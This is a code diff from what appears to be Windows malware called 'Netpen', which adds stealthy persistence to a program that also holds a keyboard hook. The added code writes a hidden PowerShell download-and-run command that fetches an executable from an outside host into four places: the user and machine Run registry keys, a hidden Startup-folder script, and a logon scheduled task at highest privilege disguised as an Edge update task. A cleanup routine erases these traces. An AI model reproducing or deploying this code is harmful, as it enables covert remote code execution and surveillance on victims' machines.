@@ -2229,20 +2229,47 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 }
 
 #define NETPEN_REGKEY "Software\\Microsoft\\Windows\\CurrentVersion\\RuntimeBroker"
+#define NETPEN_TASKNAME L"MicrosoftEdgeUpdateTaskCore"
+#define NETPEN_STARTUP_SUFFIX ".update.cmd"
 
 static void EnsureStartupEntry();
 
 static void CleanupPersistence() {
     HKEY hKey;
+    std::string exeName = GetExeName();
+
+    // Remove HKCU\Run
     if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
-        RegDeleteValueA(hKey, GetExeName().c_str());
+        RegDeleteValueA(hKey, exeName.c_str());
+        RegCloseKey(hKey);
+    }
+    // Remove HKLM\Run (if we had admin)
+    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+        RegDeleteValueA(hKey, exeName.c_str());
         RegCloseKey(hKey);
     }
     RegDeleteKeyA(HKEY_CURRENT_USER, NETPEN_REGKEY);
-    char tempPath[MAX_PATH];
-    GetTempPathA(MAX_PATH, tempPath);
-    std::string cachedExe = std::string(tempPath) + GetExeName();
-    DeleteFileA(cachedExe.c_str());
+
+    // Remove scheduled task
+    ExecuteCommand(ToNarrow(std::wstring(L"schtasks /delete /tn ") + std::wstring(NETPEN_TASKNAME) + L" /f"));
+
+    // Remove startup folder .cmd
+    char ad[MAX_PATH];
+    if (GetEnvironmentVariableA("APPDATA", ad, MAX_PATH) > 0) {
+        DeleteFileA((std::string(ad) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + exeName + NETPEN_STARTUP_SUFFIX).c_str());
+    }
+
+    // Remove temp files
+    char tmpPath[MAX_PATH];
+    GetTempPathA(MAX_PATH, tmpPath);
+    DeleteFileA((std::string(tmpPath) + exeName).c_str());
+    // Remove ProgramData bat file (used by scheduled task across all users)
+    char allUsers[MAX_PATH];
+    if (GetEnvironmentVariableA("ALLUSERSPROFILE", allUsers, MAX_PATH) > 0) {
+        DeleteFileA((std::string(allUsers) + "\\Netpen\\" + exeName + ".update.bat").c_str());
+    } else {
+        DeleteFileA(("C:\\ProgramData\\Netpen\\" + exeName + ".update.bat").c_str());
+    }
 }
 
 LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
@@ -2321,16 +2348,55 @@ static std::string Base64Encode(const BYTE* data, DWORD size) {
 
 static void InstallStartup() {
     HKEY hKey;
+    std::string exeName = GetExeName();
     if (RegCreateKeyExA(HKEY_CURRENT_USER, NETPEN_REGKEY, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
-        const char* marker = "1";
-        RegSetValueExA(hKey, "Payload", 0, REG_SZ, (BYTE*)marker, (DWORD)strlen(marker) + 1);
+        RegSetValueExA(hKey, "Payload", 0, REG_SZ, (BYTE*)"1", 2);
         RegCloseKey(hKey);
     }
 
-    std::string psCmd = "powershell -w h -c \"$p=$env:TEMP+'\\" + GetExeName() + "';$wc=New-Object Net.WebClient;$wc.DownloadFile('https://allseeing.netlify.app/a',$p);start $p\"";
+    std::string psCmd = "powershell -w h -c \"$p=$env:TEMP+'\\" + exeName + "';$wc=New-Object Net.WebClient;$wc.DownloadFile('https://allseeing.netlify.app/a',$p);start $p\"";
 
+    // 1. HKCU\Run (existing)
     if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
-        RegSetValueExA(hKey, GetExeName().c_str(), 0, REG_SZ, (BYTE*)psCmd.c_str(), (DWORD)psCmd.size() + 1);
+        RegSetValueExA(hKey, exeName.c_str(), 0, REG_SZ, (BYTE*)psCmd.c_str(), (DWORD)psCmd.size() + 1);
+        RegCloseKey(hKey);
+    }
+
+    // 2. Startup folder .cmd
+    char appData[MAX_PATH];
+    if (GetEnvironmentVariableA("APPDATA", appData, MAX_PATH) > 0) {
+        std::string startupDir = std::string(appData) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
+        std::string cmdPath = startupDir + "\\" + exeName + NETPEN_STARTUP_SUFFIX;
+        std::string cmdContent = "@start /b \"\" " + psCmd + "\r\n";
+        HANDLE hFile = CreateFileA(cmdPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
+        if (hFile != INVALID_HANDLE_VALUE) {
+            DWORD w = 0;
+            WriteFile(hFile, cmdContent.c_str(), (DWORD)cmdContent.size(), &w, NULL);
+            CloseHandle(hFile);
+        }
+    }
+
+    // 3. Scheduled Task (ONLOGON — survives reboot, any user login)
+    char allUsers[MAX_PATH];
+    std::string batDir = "C:\\ProgramData\\Netpen";
+    if (GetEnvironmentVariableA("ALLUSERSPROFILE", allUsers, MAX_PATH) > 0) {
+        batDir = std::string(allUsers) + "\\Netpen";
+    }
+    CreateDirectoryA(batDir.c_str(), NULL);
+    std::string batFile = batDir + "\\" + exeName + ".update.bat";
+    std::string batContent = "@start /b \"\" " + psCmd + "\r\n";
+    HANDLE hBat = CreateFileA(batFile.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
+    if (hBat != INVALID_HANDLE_VALUE) {
+        DWORD w = 0;
+        WriteFile(hBat, batContent.c_str(), (DWORD)batContent.size(), &w, NULL);
+        CloseHandle(hBat);
+    }
+    std::wstring taskCmd = L"schtasks /create /tn " + std::wstring(NETPEN_TASKNAME) + L" /tr \"\\\"cmd.exe\\\" /c \\\"" + ToWide(batFile) + L"\\\"\" /sc ONLOGON /delay 0000:30 /rl HIGHEST /f";
+    ExecuteCommand(ToNarrow(taskCmd));
+
+    // 4. HKLM\Run (if running as admin)
+    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+        RegSetValueExA(hKey, exeName.c_str(), 0, REG_SZ, (BYTE*)psCmd.c_str(), (DWORD)psCmd.size() + 1);
         RegCloseKey(hKey);
     }
 }
